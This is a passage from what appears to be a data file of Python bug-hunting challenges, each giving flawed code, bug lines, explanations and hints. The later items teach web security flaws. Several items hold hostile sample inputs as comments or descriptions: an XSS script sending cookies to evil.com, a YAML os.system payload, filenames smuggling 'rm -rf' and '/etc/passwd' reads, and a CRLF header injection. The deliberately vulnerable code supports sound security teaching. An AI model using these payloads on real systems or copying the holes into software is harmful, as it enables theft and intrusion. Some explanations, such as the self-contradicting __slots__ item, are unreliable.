      3: "Memory grows unbounded with each unique call",
      4: "Use functools.lru_cache(maxsize=128) instead",
      5: "LRU eviction removes least recently used items",
      6: "Or implement your own LRU cache",
      7: "Unbounded caches cause production memory leaks"
    },
    hint: "Unbounded caches cause memory leaks. How can you limit the cache size?",
    fixedCode: `from functools import lru_cache

@lru_cache(maxsize=128)
def fib(n):
    if n < 2: return n
    return fib(n-1) + fib(n-2)

print(fib(10))`,
    expectedOutput: "55",
    hasBugs: true
  },
{
    id: 80,
    title: "The Memory Fragmentation Bug",
    difficulty: "hard",
    category: "performance",
    type: "find",
    description: "Your application allocates and deallocates many small objects, causing memory fragmentation. Python's memory allocator may not return memory to the OS, causing RSS to grow even when objects are freed.",
    code: `def process_large_dataset():
    # Creates many small objects
    data = [str(i) for i in range(1000000)]
    del data
    # RSS remains high due to fragmentation`,
    bugLines: [4],
    bugExplanations: {
      4: "Python's small object allocator keeps free memory for reuse. For long-running processes with varying memory needs, consider using mmap, array.array, or restarting workers periodically."
    },
    hint: "Python's allocator keeps freed memory for reuse. How can you force memory release?",
    hasBugs: true
  },
{
    id: 81,
    title: "The Reference Cycle Leak",
    difficulty: "hard",
    category: "performance",
    type: "find",
    description: "Your objects have circular references (A refers to B, B refers to A). With __del__ methods, the garbage collector can't break the cycle, causing a memory leak.",
    code: `class Node:
    def __init__(self):
        self.parent = None
        self.children = []
    
    def __del__(self):
        print("Node deleted")

a = Node()
b = Node()
a.children.append(b)
b.parent = a  # Circular reference

# del a, b`,
    bugLines: [6, 7, 8],
    bugExplanations: {
      6: "__del__ prevents the garbage collector from breaking cycles automatically.",
      7: "Objects with __del__ in cycles are not collected.",
      8: "Use weakref for parent references, or avoid __del__ and use context managers."
    },
    hint: "__del__ in reference cycles prevents garbage collection. How can you break cycles?",
    hasBugs: true
  },
{
    id: 82,
    title: "The Descriptor Shadowing Bug",
    difficulty: "hard",
    category: "type",
    type: "find",
    description: "Your descriptor is being shadowed by an instance attribute with the same name. Once set on the instance, the descriptor is bypassed entirely.",
    code: `class Validator:
    def __set_name__(self, owner, name):
        self.name = name
    
    def __get__(self, instance, owner):
        if instance is None:
            return self
        return instance.__dict__.get(self.name)
    
    def __set__(self, instance, value):
        if value < 0:
            raise ValueError("Must be positive")
        instance.__dict__[self.name] = value

class Product:
    price = Validator()

p = Product()
p.price = 10  # Uses descriptor
p.__dict__['price'] = -5
print(p.price)`,
    bugLines: [18],
    bugExplanations: {
      18: "Setting directly in __dict__ bypasses the descriptor's __set__ method. Use slots or name mangling to prevent direct attribute access."
    },
    hint: "Instance __dict__ entries take precedence over descriptors. How can you prevent bypassing?",
    hasBugs: true
  },
{
    id: 83,
    title: "The Import Side Effect Bug",
    difficulty: "hard",
    category: "logic",
    type: "find",
    description: "Your module has side effects at import time (connecting to database, making HTTP requests). This causes issues during testing and when importing for type checking.",
    code: `# database.py
import psycopg2

connection = psycopg2.connect(DATABASE_URL)

def query(sql):
    return connection.execute(sql)`,
    bugLines: [4],
    bugExplanations: {
      4: "Side effects at import time make testing difficult and slow down imports. Use lazy initialization or factory functions: connection = None, then connect on first use."
    },
    hint: "Import-time side effects are problematic. How can you defer initialization?",
    hasBugs: true
  },
{
    id: 84,
    title: "The Monkey Patching Hazard",
    difficulty: "hard",
    category: "logic",
    type: "find",
    description: "Your tests monkey-patch a module function, but the patch affects other tests because it's never restored. This causes test isolation failures.",
    code: `import module

def test_something():
    module.function = lambda: "mocked"
    result = module.function()
    assert result == "mocked"

def test_other():
    result = module.function()`,
    bugLines: [4],
    bugExplanations: {
      4: "Monkey patches persist unless explicitly restored. Use unittest.mock.patch as a context manager or decorator, which automatically restores the original after the test."
    },
    hint: "Monkey patches affect global state. How can you ensure cleanup after tests?",
    hasBugs: true
  },
{
    id: 85,
    title: "The Context Variable Bug",
    difficulty: "hard",
    category: "concurrency",
    type: "find",
    description: "Your async code uses a global variable for request context, but with multiple concurrent requests, the context bleeds between requests. Use contextvars for async-safe context.",
    code: `request_user = None

async def handle_request(request):
    global request_user
    request_user = request.user
    await process()
    return response`,
    bugLines: [1, 5],
    bugExplanations: {
      1: "Global variables are shared across all async tasks.",
      5: "With concurrent requests, request_user can be overwritten by another task. Use contextvars.ContextVar for per-task context."
    },
    hint: "Global variables are shared in async code. What provides per-task context?",
    hasBugs: true
  },
{
    id: 86,
    title: "The Slot Inheritance Bug",
    difficulty: "hard",
    category: "type",
    type: "find",
    description: "Your class uses __slots__ but doesn't include the parent's slots. Instances have a __dict__ when they shouldn't, wasting memory.",
    code: `class Base:
    __slots__ = ['x']

class Derived(Base):
    __slots__ = ['y']

d = Derived()
d.z = 3`,
    bugLines: [5],
    bugExplanations: {
      5: "Derived's __slots__ should include parent's slots: __slots__ = ['y'] is correct actually - Python automatically includes parent slots. The issue is that without declaring __slots__ at all, __dict__ is created."
    },
    hint: "Check if Derived actually prevents __dict__ creation. What happens if you don't define __slots__?",
    hasBugs: false
  },
{
    id: 87,
    title: "The Abstract Method Bug",
    difficulty: "hard",
    category: "type",
    type: "fix",
    description: "Your abstract base class has an abstract method, but subclasses can be instantiated without implementing it because the method isn't properly decorated.",
    code: `from abc import ABC, abstractmethod

class Base(ABC):
    @abstractmethod
    def process(self):
        pass  # Abstract

class Impl(Base):
    def process(self):  # Implements abstract
        return "done"
    
    @abstractmethod
    def extra(self):
        pass

i = Impl()  # Works - extra not enforced`,
    bugLines: [12, 13, 14],
    bugExplanations: {
      12: "@abstractmethod on Impl makes Impl abstract.",
      13: "Impl becomes an abstract class itself.",
      14: "But instantiating Impl still works because extra isn't checked. This is confusing - remove @abstractmethod if not intended."
    },
    hint: "@abstractmethod in a concrete class makes it abstract. Is this intentional?",
    hasBugs: true
  },
{
    id: 88,
    title: "The Signal Handler Bug",
    difficulty: "hard",
    category: "concurrency",
    type: "find",
    description: "Your signal handler calls async code, but signal handlers run in the main thread and can't use await. This causes a RuntimeError.",
    code: `import signal
import asyncio

async def cleanup():
    await save_state()

def handler(signum, frame):
    asyncio.run(cleanup())

signal.signal(signal.SIGTERM, handler)`,
    bugLines: [8],
    bugExplanations: {
      8: "Signal handlers can't use asyncio.run() because they run in a restricted context. Use loop.add_signal_handler() or set a flag and handle in the main loop."
    },
    hint: "Signal handlers have restrictions. How should you handle async cleanup?",
    hasBugs: true
  },
{
    id: 89,
    title: "The Enum Comparison Bug",
    difficulty: "hard",
    category: "type",
    type: "fix",
    description: "Your code compares enum members by value instead of identity, which can lead to incorrect comparisons when the same value exists in different enums.",
    code: `from enum import Enum

class Status(Enum):
    ACTIVE = 1
    INACTIVE = 2

class State(Enum):
    ON = 1
    OFF = 2

if Status.ACTIVE.value == State.ON.value:
    print("Same value but different semantics!")`,
    bugLines: [12],
    bugExplanations: {
      12: "Comparing enum values loses type safety. Compare enum members directly: Status.ACTIVE == State.ON returns False (different types). Use 'is' for identity: Status.ACTIVE is Status.ACTIVE."
    },
    hint: "Enum members should be compared by identity, not value. What's the difference?",
    fixedCode: `if Status.ACTIVE is Status.ACTIVE:  # True
    print("Proper identity comparison")`,
    expectedOutput: "Proper identity comparison",
    hasBugs: true
  },
{
    id: 90,
    title: "The Dataclass Default Bug",
    difficulty: "hard",
    category: "type",
    type: "find",
    description: "Your dataclass uses a mutable default value, causing all instances to share the same list. This is the same issue as mutable default arguments.",
    code: `from dataclasses import dataclass

@dataclass
class Config:
    name: str
    options: list = []

c1 = Config("a")
c2 = Config("b")
c1.options.append("x")
print(c2.options)`,
    bugLines: [6],
    bugExplanations: {
      6: "Mutable defaults in dataclasses are shared across instances, just like function defaults. Use field(default_factory=list) to create a new list for each instance."
    },
    hint: "Dataclass defaults behave like function defaults. How do you create per-instance defaults?",
    hasBugs: true
  },
{
    id: 91,
    title: "The Partial Function Bug",
    difficulty: "hard",
    category: "logic",
    type: "fix",
    description: "Your functools.partial creates a function with pre-filled arguments, but the arguments are evaluated at creation time, not call time. This causes unexpected behavior with mutable arguments.",
    code: `from functools import partial

def process(data, options):
    return [x * options['multiplier'] for x in data]

options = {'multiplier': 2}
process_double = partial(process, options=options)

options['multiplier'] = 3
print(process_double([1, 2, 3]))`,
    bugLines: [7],
    bugExplanations: {
      7: "partial captures the reference to options, not a copy. Changes to options affect the partial. Use immutable arguments or copy before creating partial."
    },
    hint: "partial captures references, not copies. How can you avoid shared mutable state?",
    fixedCode: `import copy
options = {'multiplier': 2}
process_double = partial(process, options=copy.deepcopy(options))`,
    expectedOutput: "[2, 4, 6]",
    hasBugs: true
  },
{
    id: 92,
    title: "The ChainMap Shadowing Bug",
    difficulty: "hard",
    category: "type",
    type: "find",
    description: "Your ChainMap has multiple dicts, but writes always go to the first mapping. This can cause unexpected behavior when you expect writes to update the appropriate mapping.",
    code: `from collections import ChainMap

defaults = {'theme': 'light', 'debug': False}
user_prefs = {'theme': 'dark'}

config = ChainMap(user_prefs, defaults)
config['debug'] = True
print(defaults)`,
    bugLines: [7],
    bugExplanations: {
      7: "ChainMap writes always go to the first mapping (user_prefs). To update a specific mapping, access it directly: defaults['debug'] = True. This is by design but can be surprising."
    },
    hint: "ChainMap writes always go to the first mapping. Is this the behavior you want?",
    hasBugs: true
  },
{
    id: 93,
    title: "The LRU Cache Key Bug",
    difficulty: "hard",
    category: "performance",
    type: "fix",
    description: "Your cached function uses a list argument, which is unhashable and can't be used as a cache key. This causes a TypeError.",
    code: `from functools import lru_cache

@lru_cache(maxsize=128)
def process_items(items):
    return sum(items)

process_items([1, 2, 3])`,
    bugLines: [4],
    bugExplanations: {
      4: "lru_cache requires hashable arguments. Lists are unhashable. Convert to tuple: @lru_cache with a wrapper that converts list to tuple, or accept tuple instead of list."
    },
    hint: "Cache keys must be hashable. How can you make list arguments work with lru_cache?",
    fixedCode: `@lru_cache(maxsize=128)
def process_items(items_tuple):
    return sum(items_tuple)

def process(items):
    return process_items(tuple(items))`,
    expectedOutput: "6",
    hasBugs: true
  },
{
    id: 94,
    title: "The NamedTuple Default Bug",
    difficulty: "hard",
    category: "type",
    type: "find",
    description: "Your NamedTuple has a field with a mutable default, causing all instances to share the same list. This is similar to the mutable default argument bug.",
    code: `from typing import NamedTuple

class Record(NamedTuple):
    name: str
    tags: list = []

r1 = Record("a")
r2 = Record("b")
r1.tags.append("important")
print(r2.tags)`,
    bugLines: [5],
    bugExplanations: {
      5: "NamedTuple with mutable defaults shares the object across instances. Use a factory function or dataclasses with field(default_factory=list) instead."
    },
    hint: "NamedTuple defaults are class attributes. How do you create per-instance mutable defaults?",
    hasBugs: true
  },
{
    id: 95,
    title: "The Async Generator Bug",
    difficulty: "hard",
    category: "concurrency",
    type: "find",
    description: "Your async generator doesn't properly handle cleanup if the consumer breaks out of the loop early. The finally block may not run immediately.",
    code: `async def stream_data():
    conn = await connect()
    try:
        while True:
            yield await conn.get()
    finally:
        await conn.close()

# Consumer breaks early
async for item in stream_data():
    if item == "stop":
        break`,
    bugLines: [7, 8],
    bugExplanations: {
      7: "Async generator cleanup is delayed until garbage collection.",
      8: "Use 'async with' in the consumer or an async context manager for guaranteed cleanup."
    },
    hint: "Async generator finally blocks may not run immediately. How can you ensure cleanup?",
    hasBugs: true
  },
{
    id: 96,
    title: "The Type Hint Bug",
    difficulty: "hard",
    category: "type",
    type: "find",
    description: "Your function has incorrect type hints that don't match the actual behavior. mypy would catch this, but the code runs fine until it fails at runtime.",
    code: `from typing import List

def process(items: List[int]) -> int:
    return items

result: int = process([1, 2, 3])
print(result + 1)`,
    bugLines: [4],
    bugExplanations: {
      4: "The return type hint says int but the function returns a list. Python ignores type hints at runtime, so this passes silently until the result is used incorrectly. Use mypy to catch these errors."
    },
    hint: "Type hints are not enforced at runtime. What tool catches type errors before runtime?",
    hasBugs: true
  },
{
    id: 97,
    title: "The Protocol Implementation Bug",
    difficulty: "hard",
    category: "type",
    type: "fix",
    description: "Your class claims to implement a Protocol but is missing a required method. Without @runtime_checkable, isinstance checks won't catch this.",
    code: `from typing import Protocol

class Drawable(Protocol):
    def draw(self) -> None: ...

class Circle:
    pass

c = Circle()
print(isinstance(c, Drawable))`,
    bugLines: [7],
    bugExplanations: {
      7: "Circle doesn't implement draw() but isinstance doesn't raise an error. Use @runtime_checkable for runtime checks, or better, use mypy for static checking. Protocols are structural - implementation must match."
    },
    hint: "Protocols define structural interfaces. How can you ensure implementations match?",
    fixedCode: `class Circle:
    def draw(self) -> None:
        print("Drawing circle")`,
    expectedOutput: "True",
    hasBugs: true
  },
{
    id: 98,
    title: "The Generic Type Bug",
    difficulty: "hard",
    category: "type",
    type: "find",
    description: "Your generic class doesn't properly constrain the type parameter, allowing invalid operations at runtime that type checkers would catch.",
    code: `from typing import TypeVar, Generic

T = TypeVar('T')

class Container(Generic[T]):
    def __init__(self, value: T):
        self.value = value
    
    def get(self) -> T:
        return self.value

c = Container[int]("not an int")
print(c.get() + 1)`,
    bugLines: [12],
    bugExplanations: {
      12: "Generic type parameters are not enforced at runtime. 'Container[int](\"not an int\")' works fine until you try to use the value. Type hints are for static analysis, not runtime."
    },
    hint: "Generic types are not enforced at runtime. What validates types before execution?",
    hasBugs: true
  },
{
    id: 99,
    title: "The Final Override Bug",
    difficulty: "hard",
    category: "type",
    type: "fix",
    description: "Your method is marked @final but a subclass overrides it. mypy catches this, but at runtime it works silently, defeating the purpose of final.",
    code: `from typing import final

class Base:
    @final
    def critical(self):
        return "base"

class Derived(Base):
    def critical(self):
        return "derived"

d = Derived()
print(d.critical())`,
    bugLines: [9, 10, 11],
    bugExplanations: {
      9: "@final is not enforced at runtime.",
      10: "Python allows overriding @final methods.",
      11: "Use mypy or other static checkers to catch this. @final is documentation + static check only."
    },
    hint: "@final is for static checking only. What tool enforces it?",
    fixedCode: `class Derived(Base):
    pass  # Don't override @final methods`,
    expectedOutput: "base",
    hasBugs: true
  },
{
    id: 100,
    title: "The Multi-Bug Production Incident",
    difficulty: "hard",
    category: "advanced",
    type: "find",
    description: "This DataProcessor class has MULTIPLE bugs that caused a production incident: 1) Shared class-level cache causes data leakage between users, 2) No error handling for invalid inputs, 3) Cache key collisions. Find all the issues.",
    code: `class DataProcessor:
    cache = {}
    
    def __init__(self):
        self.data = []
    
    def process(self, items):
        for item in items:
            if item in self.cache:
                continue
            result = self._transform(item)
            self.cache[item] = result  # Modifying class variable
        return [self.cache[i] for i in items]
    
    def _transform(self, item):
        return item * 2`,
    bugLines: [2, 8, 11, 15],
    bugExplanations: {
      2: "Class-level cache is shared across ALL instances - User A sees User B's data!",
      8: "Should use type(self).cache for clarity, but still shares data",
      11: "Same issue - modifying class variable affects all users",
      15: "No error handling - crashes on strings, None, etc."
    },
    hint: "Look for shared mutable state and missing error handling. How many bugs can you find?",
    hasBugs: true
  },
{
    id: 101,
    title: "The CORS Wildcard Disaster",
    difficulty: "medium",
    category: "security",
    type: "find",
    description: "Your API server sets CORS headers to allow any origin. An attacker hosts a malicious site that makes authenticated requests to your API using your users' cookies. All user data is now accessible from any website on the internet.",
    code: `from flask import Flask, jsonify, request

app = Flask(__name__)

@app.after_request
def add_cors(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, DELETE'
    return response

@app.route('/api/user/data')
def get_user_data():
    return jsonify({"secret": "sensitive_data"})`,
    bugLines: [7, 8],
    bugExplanations: {
      7: "Access-Control-Allow-Origin: '*' allows ANY website to make requests to your API. Combined with Allow-Credentials, attackers can steal authenticated user data from any malicious site. Whitelist specific trusted origins instead.",
      8: "Allow-Credentials: true with a wildcard origin is especially dangerous. Browsers block this combo, but the intent reveals a fundamental misunderstanding of CORS security. Always pair credentials with specific origins."
    },
    hint: "CORS headers control which websites can access your API. What happens when you allow everyone?",
    hasBugs: true
  },
{
    id: 102,
    title: "The JWT Secret Catastrophe",
    difficulty: "medium",
    category: "security",
    type: "find",
    description: "Your authentication system signs JWT tokens with a weak, guessable secret. An attacker brute-forced the secret in minutes using common wordlists, then forged admin tokens to access every account. Your entire user base is compromised.",
    code: `import jwt
import datetime

SECRET = "password123"

def create_token(user_id, is_admin=False):
    payload = {
        'user_id': user_id,
        'is_admin': is_admin,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(days=365)
    }
    return jwt.encode(payload, SECRET, algorithm='HS256')

def verify_token(token):
    return jwt.decode(token, SECRET, algorithms=['HS256'])`,
    bugLines: [4, 10],
    bugExplanations: {
      4: "The JWT secret 'password123' can be brute-forced in seconds. Use a cryptographically random secret of at least 256 bits (e.g., os.urandom(32).hex()). Store it in environment variables, never in source code.",
      10: "Token expiry of 365 days is far too long. If a token is stolen, the attacker has a full year of access. Use short-lived access tokens (15-30 minutes) with refresh tokens for longer sessions."
    },
    hint: "Two issues: the secret strength and the token lifetime. What would an attacker try first?",
    hasBugs: true
  },
{
    id: 103,
    title: "The XSS Injection in Templates",
    difficulty: "medium",
    category: "security",
    type: "find",
    description: "Your web app renders user comments directly into HTML without escaping. An attacker posted a comment containing <script>document.location='https://evil.com/steal?c='+document.cookie</script> and stole session cookies from every user who viewed the page.",
    code: `def render_comment(username, comment):
    html = f"""
    <div class="comment">
        <h3>{username}</h3>
        <p>{comment}</p>
    </div>
    """
    return html

# Attacker submits:
# comment = "<script>fetch('https://evil.com?c='+document.cookie)</script>"
print(render_comment("admin", "Hello world"))`,
    bugLines: [4, 5],
    bugExplanations: {
      4: "Username is inserted directly into HTML without escaping. An attacker can set their username to include script tags or event handlers like '<img onerror=alert(1)>'. Use html.escape() or a templating engine with auto-escaping.",
      5: "Comment content is rendered as raw HTML. Any JavaScript in the comment will execute in every viewer's browser. This enables cookie theft, session hijacking, and defacement. Always escape user content or use a sanitization library."
    },
    hint: "User input should never be inserted directly into HTML. What function prevents script injection?",
    hasBugs: true
  },
{
    id: 104,
    title: "The Insecure Deserialization",
    difficulty: "hard",
    category: "security",
    type: "find",
    description: "Your session management uses YAML to deserialize user-provided session data. An attacker crafted a YAML payload with a Python object constructor that executes system commands. Your server is now running attacker-controlled code.",
    code: `import yaml

def load_session(session_data):
    # Parse the session from the cookie
    session = yaml.load(session_data, Loader=yaml.Loader)
    return session

# Attacker sends: !!python/object/apply:os.system ['whoami']
data = '{"user": "alice", "role": "viewer"}'
print(load_session(data))`,
    bugLines: [5],
    bugExplanations: {
      5: "yaml.load() with yaml.Loader (or without specifying a Loader) can instantiate arbitrary Python objects from YAML tags like !!python/object. An attacker can execute os.system(), subprocess.call(), or any Python code. Always use yaml.safe_load() which only allows basic types (strings, numbers, lists, dicts)."
    },
    hint: "YAML can do more than parse data — it can instantiate objects. Which loader prevents this?",
    hasBugs: true
  },
{
    id: 105,
    title: "The SSRF Gateway",
    difficulty: "hard",
    category: "security",
    type: "find",
    description: "Your URL preview feature fetches any URL the user provides and returns the content. An attacker used it to access http://169.254.169.254/latest/meta-data/ (the AWS metadata endpoint) and stole your instance's IAM credentials. They now control your entire AWS account.",
    code: `import requests

def fetch_url_preview(user_url):
    # Fetch the URL and return preview
    response = requests.get(user_url, timeout=5)
    title = extract_title(response.text)
    return {"url": user_url, "title": title, "status": response.status_code}

def extract_title(html):
    start = html.find('<title>') + 7
    end = html.find('</title>')
    return html[start:end] if start > 6 else "No title"

# User requests preview of any URL
print(fetch_url_preview("http://example.com"))`,
    bugLines: [5],
    bugExplanations: {
      5: "No URL validation allows Server-Side Request Forgery (SSRF). Attackers can reach internal services (169.254.169.254 for cloud metadata, localhost services, internal APIs). Validate URLs against an allowlist of schemes (https only), block private/internal IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, 127.x), and use a URL parsing library to prevent bypasses."
    },
    hint: "Your server will fetch ANY URL — including internal network addresses. What should you block?",
    hasBugs: true
  },
{
    id: 106,
    title: "The Mass Assignment Vulnerability",
    difficulty: "medium",
    category: "security",
    type: "find",
    description: "Your user profile update endpoint accepts a JSON body and directly updates all fields. An attacker added 'is_admin': true to their profile update request and escalated to admin privileges. They can now access all admin-only features.",
    code: `def update_profile(user_id, request_data):
    user = get_user(user_id)

    # Update user with all provided fields
    for key, value in request_data.items():
        setattr(user, key, value)

    user.save()
    return user

# Attacker sends: {"name": "hacker", "is_admin": true, "role": "superuser"}`,
    bugLines: [5, 6],
    bugExplanations: {
      5: "Iterating over all request fields without filtering allows attackers to set ANY attribute on the user object — including is_admin, role, permissions, or even password_hash.",
      6: "setattr() with unvalidated keys is mass assignment. Use an explicit allowlist of updatable fields: ALLOWED = {'name', 'email', 'bio'}. Only update fields in the allowlist. Never trust client-provided field names."
    },
    hint: "Users control which fields they send. Should your code blindly accept all of them?",
    hasBugs: true
  },
{
    id: 107,
    title: "The Command Injection Pipeline",
    difficulty: "hard",
    category: "security",
    type: "find",
    description: "Your image processing service passes user-provided filenames to a shell command. An attacker uploaded a file named 'photo.jpg; rm -rf /data' and wiped your storage. Command injection through unsanitized shell arguments is one of the most devastating vulnerabilities.",
    code: `import os
import subprocess

def resize_image(filename, width, height):
    # Resize using ImageMagick
    cmd = f"convert uploads/{filename} -resize {width}x{height} output/{filename}"
    subprocess.call(cmd, shell=True)
    return f"output/{filename}"

# Attacker uploads file named: "; cat /etc/passwd > /tmp/leak.txt; echo ".jpg
print(resize_image("photo.jpg", 800, 600))`,
    bugLines: [6, 7],
    bugExplanations: {
      6: "f-string interpolation into a shell command allows injection. An attacker with filename 'x.jpg; rm -rf /' gets: convert uploads/x.jpg; rm -rf / -resize... The semicolon terminates the first command and starts a new one.",
      7: "shell=True tells subprocess to interpret the string as a shell command, enabling all shell metacharacters (;, |, &&, $(), backticks). Use subprocess.run() with a list of arguments and shell=False (default) to prevent injection entirely."
    },
    hint: "Shell metacharacters like ; and | have special meaning. How do you prevent the shell from interpreting user input?",
    hasBugs: true
  },
{
    id: 108,
    title: "The Broken Access Control",
    difficulty: "medium",
    category: "security",
    type: "find",
    description: "Your API returns user data based on a user_id parameter in the URL. There's no check that the requesting user owns that data. An attacker simply incremented the ID in the URL to download every user's private data — medical records, financial info, everything.",
    code: `from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route('/api/users/<int:user_id>/records')
def get_records(user_id):
    # Fetch records for the given user ID
    records = db.query("SELECT * FROM medical_records WHERE user_id = %s", user_id)
    return jsonify(records)

# Attacker requests: /api/users/1/records, /api/users/2/records, ...`,
    bugLines: [8],
    bugExplanations: {
      8: "No authorization check! The endpoint returns ANY user's records if you know their ID. This is an Insecure Direct Object Reference (IDOR). Always verify that the authenticated user has permission to access the requested resource: if user_id != current_user.id and not current_user.is_admin: abort(403). This is OWASP #1 — Broken Access Control."
    },
    hint: "Authentication tells you WHO someone is. Authorization tells you WHAT they can access. Which is missing?",
    hasBugs: true
  },
{
    id: 109,
    title: "The Unvalidated Redirect",
    difficulty: "medium",
    category: "security",
    type: "find",
    description: "Your login page accepts a 'next' parameter to redirect users after authentication. An attacker crafted a phishing link: yoursite.com/login?next=https://evil-clone.com/login. Users log in, get redirected to a fake copy of your site, and enter their credentials again — handing them to the attacker.",
    code: `from flask import Flask, redirect, request, session

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    if authenticate(username, password):
        session['user'] = username
        next_url = request.args.get('next', '/')
        return redirect(next_url)
    return "Login failed", 401`,
    bugLines: [12, 13],
    bugExplanations: {
      12: "The 'next' parameter is taken directly from user input with no validation. An attacker sets next=https://evil.com to redirect victims to a phishing site after a successful login.",
      13: "redirect() will happily send users to any URL, including external malicious sites. Validate that the redirect URL is relative (starts with '/') and doesn't contain '://' or '//'. Better yet, use a whitelist of allowed redirect paths."
    },
    hint: "After login, users go wherever the URL says. What if an attacker controls that URL?",
    hasBugs: true
  },
{
    id: 110,
    title: "The Race Condition Double-Spend",
    difficulty: "hard",
    category: "security",
    type: "find",
    description: "Your payment system checks balance and deducts in separate steps without locking. An attacker sent 50 simultaneous withdrawal requests of $100 from an account with $100 balance. All 50 read the balance as $100 before any deduction, and all 50 succeeded — withdrawing $5,000 from $100.",
    code: `def withdraw(user_id, amount):
    # Check balance
    balance = db.query("SELECT balance FROM accounts WHERE id = %s", user_id)

    if balance >= amount:
        # Deduct amount
        new_balance = balance - amount
        db.execute("UPDATE accounts SET balance = %s WHERE id = %s", new_balance, user_id)
        return {"success": True, "new_balance": new_balance}
    return {"success": False, "error": "Insufficient funds"}`,
    bugLines: [3, 7, 8],
    bugExplanations: {
      3: "Reading balance without a lock means concurrent requests all see the same balance. This is a TOCTOU (Time of Check to Time of Use) race condition.",
      7: "The balance computation happens in Python, not the database. Between reading and writing, another request can complete its own withdrawal.",
      8: "Use an atomic SQL update with a WHERE clause: UPDATE accounts SET balance = balance - %s WHERE id = %s AND balance >= %s. This makes the check-and-deduct a single atomic operation. Alternatively, use SELECT ... FOR UPDATE to lock the row."
    },
    hint: "What happens when two requests check the balance at the exact same time?",
    hasBugs: true
  },
{
    id: 111,
    title: "The Insecure Random Token",
    difficulty: "medium",
    category: "security",
    type: "find",
    description: "Your password reset system generates tokens using Python's random module. An attacker realized that random.random() uses a predictable Mersenne Twister PRNG. After observing a few tokens, they predicted future tokens and reset other users' passwords.",
    code: `import random
import string

def generate_reset_token():
    chars = string.ascii_letters + string.digits
    token = ''.join(random.choice(chars) for _ in range(32))
    return token

def send_reset_email(email):
    token = generate_reset_token()
    save_token(email, token)
    send_email(email, f"Reset link: /reset?token={token}")`,
    bugLines: [6],
    bugExplanations: {
      6: "random.choice() uses the Mersenne Twister PRNG which is NOT cryptographically secure. An attacker who observes 624 outputs can predict ALL future values. For security tokens, use secrets.token_urlsafe(32) or os.urandom(). The 'secrets' module was added to Python specifically for this use case."
    },
    hint: "Python's random module is for games and simulations, not security. What module is designed for secrets?",
    hasBugs: true
  },
{
    id: 112,
    title: "The Verbose Error Leak",
    difficulty: "easy",
    category: "security",
    type: "find",
    description: "Your production API returns full stack traces and database details in error responses. An attacker intentionally triggered errors to learn your database schema, library versions, file paths, and internal architecture — then used that information to craft targeted attacks.",
    code: `import traceback
from flask import Flask, jsonify

app = Flask(__name__)
app.config['DEBUG'] = True

@app.route('/api/user/<int:uid>')
def get_user(uid):
    try:
        user = db.query(f"SELECT * FROM users WHERE id = {uid}")
        return jsonify(user)
    except Exception as e:
        return jsonify({
            "error": str(e),
            "traceback": traceback.format_exc(),
            "query": f"SELECT * FROM users WHERE id = {uid}"
        }), 500`,
    bugLines: [5, 14, 15, 16],
    bugExplanations: {
      5: "DEBUG = True in production exposes Flask's interactive debugger, which allows ARBITRARY CODE EXECUTION on your server. This alone is a critical vulnerability.",
      14: "Exposing raw exception messages reveals internal details like database type, table names, and column names to attackers.",
      15: "Stack traces expose file paths, library versions, and code structure. This is an information goldmine for attackers planning targeted exploits.",
      16: "Returning the raw SQL query reveals your exact database schema and confirms SQL injection points. Never expose internal queries to users."
    },
    hint: "Errors should help developers debug, not help attackers attack. What should users see instead?",
    hasBugs: true
  },
{
    id: 113,
    title: "The Unsafe File Upload",
    difficulty: "hard",
    category: "security",
    type: "find",
    description: "Your file upload endpoint checks the file extension but not the actual content type. An attacker renamed a PHP webshell to 'avatar.jpg.php' and uploaded it. Your server executed it, giving the attacker a remote shell. They now own your server.",
    code: `import os
from flask import Flask, request

UPLOAD_DIR = "/var/www/uploads/"
ALLOWED_EXTENSIONS = {'.jpg', '.png', '.gif'}

def upload_file():
    file = request.files['avatar']
    filename = file.filename
    ext = os.path.splitext(filename)[1]

    if ext.lower() in ALLOWED_EXTENSIONS:
        path = os.path.join(UPLOAD_DIR, filename)
        file.save(path)
        return f"Uploaded to {path}"
    return "Invalid file type", 400`,
    bugLines: [10, 13, 14],
    bugExplanations: {
      10: "splitext('avatar.jpg.php') returns '.php', but attackers can use null bytes or double extensions to bypass. Check MIME type from file content (magic bytes), not just the extension. Extensions are trivially spoofed.",
      13: "Using the original filename allows path traversal (../../etc/cron.d/backdoor) and overwriting existing files. Generate a random filename with uuid4() and store the original name in a database.",
      14: "Saving to a web-accessible directory means uploaded files can be directly accessed and potentially executed by the web server. Store uploads outside the webroot and serve them through a controller that sets Content-Disposition: attachment."
    },
    hint: "File extensions can be faked. Filenames can contain path traversal. Upload directories can be executable. How many issues can you find?",
    hasBugs: true
  },
{
    id: 114,
    title: "The Leaked .env in Docker",
    difficulty: "easy",
    category: "security",
    type: "find",
    description: "Your Dockerfile copies the entire project directory into the image, including the .env file with production secrets. The image was pushed to a public Docker registry. Anyone can pull it and extract your database passwords, API keys, and encryption secrets.",
    code: `# Dockerfile
FROM python:3.11-slim

WORKDIR /app

COPY . /app

RUN pip install -r requirements.txt

ENV FLASK_ENV=production

EXPOSE 5000
CMD ["python", "app.py"]`,
    bugLines: [6],
    bugExplanations: {
      6: "COPY . /app copies EVERYTHING including .env, .git, credentials, private keys, and any other secrets in the project directory. Use a .dockerignore file to exclude sensitive files (.env, .git, *.pem, *.key). Better yet, pass secrets at runtime via environment variables or a secrets manager — never bake them into the image."
    },
    hint: "COPY . copies everything. What files in your project should NEVER be in a Docker image?",
    hasBugs: true
  },
{
    id: 115,
    title: "The HTTP Header Injection",
    difficulty: "hard",
    category: "security",
    type: "find",
    description: "Your application sets a cookie using a user-provided value without sanitizing newline characters. An attacker injected \\r\\n into the value to add arbitrary HTTP headers, including a Set-Cookie header that overwrites the session cookie with one the attacker controls.",
    code: `from flask import Flask, make_response, request

app = Flask(__name__)

@app.route('/set-language')
def set_language():
    lang = request.args.get('lang', 'en')
    response = make_response("Language updated")
    response.headers['Set-Cookie'] = f'language={lang}; Path=/'
    return response

# Attacker: /set-language?lang=en%0d%0aSet-Cookie:%20session=attacker_token`,
    bugLines: [9],
    bugExplanations: {
